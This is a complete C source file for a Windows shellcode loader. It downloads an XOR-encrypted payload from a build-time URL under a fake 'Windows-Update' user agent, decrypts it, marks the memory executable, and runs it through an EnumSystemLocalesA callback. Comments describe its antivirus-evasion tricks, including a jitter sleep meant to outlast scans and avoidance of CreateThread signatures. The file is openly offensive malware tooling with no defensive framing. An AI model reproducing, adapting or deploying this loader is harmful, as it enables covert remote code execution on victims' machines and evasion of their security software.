/*
 * Shellcode loader — callback-based execution via EnumSystemLocalesA
 * No CreateThread, no CreateRemoteThread — avoids common AV signatures.
 * TMPL_SC_URL and TMPL_XOR_KEY replaced at build time.
 */
#include <windows.h>
#include <wininet.h>

#define SC_URL TMPL_SC_URL
#define XK     TMPL_XOR_KEY

/* Download bytes via WinINet, returns heap buffer + size */
static BYTE *dl(DWORD *out_sz) {
    HINTERNET hi = InternetOpenA(
        "Windows-Update/10.0",
        INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hi) return NULL;

    HINTERNET hu = InternetOpenUrlA(hi, SC_URL, NULL, 0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
        INTERNET_FLAG_NO_UI, 0);
    if (!hu) { InternetCloseHandle(hi); return NULL; }

    DWORD cap = 1 << 23;  /* 8 MB */
    BYTE *buf = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cap);
    if (!buf) { InternetCloseHandle(hu); InternetCloseHandle(hi); return NULL; }

    DWORD got = 0, rd = 0;
    while (InternetReadFile(hu, buf + got, 65536, &rd) && rd) got += rd;
    *out_sz = got;

    InternetCloseHandle(hu);
    InternetCloseHandle(hi);
    return buf;
}

int WINAPI WinMain(HINSTANCE hI, HINSTANCE hP, LPSTR lpC, int nC) {
    /* Jitter sleep — passes initial AV scan window */
    Sleep(5000 + (GetTickCount() % 8000));

    DWORD sz = 0;
    BYTE *enc = dl(&sz);
    if (!enc || !sz) return 1;

    /* Decrypt in-place */
    for (DWORD i = 0; i < sz; i++) enc[i] ^= (BYTE)(XK);

    /* Allocate RW, copy shellcode, flip to RX */
    LPVOID mem = VirtualAlloc(NULL, sz,
                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) { HeapFree(GetProcessHeap(), 0, enc); return 1; }

    RtlMoveMemory(mem, enc, sz);
    HeapFree(GetProcessHeap(), 0, enc);

    DWORD old;
    VirtualProtect(mem, sz, PAGE_EXECUTE_READ, &old);

    /*
     * Execute via EnumSystemLocalesA callback — treats shellcode as a
     * LOCALE_ENUMPROCA function pointer. Avoids CreateThread signature.
     */
    EnumSystemLocalesA((LOCALE_ENUMPROCA)mem, LCID_INSTALLED);

    return 0;
}
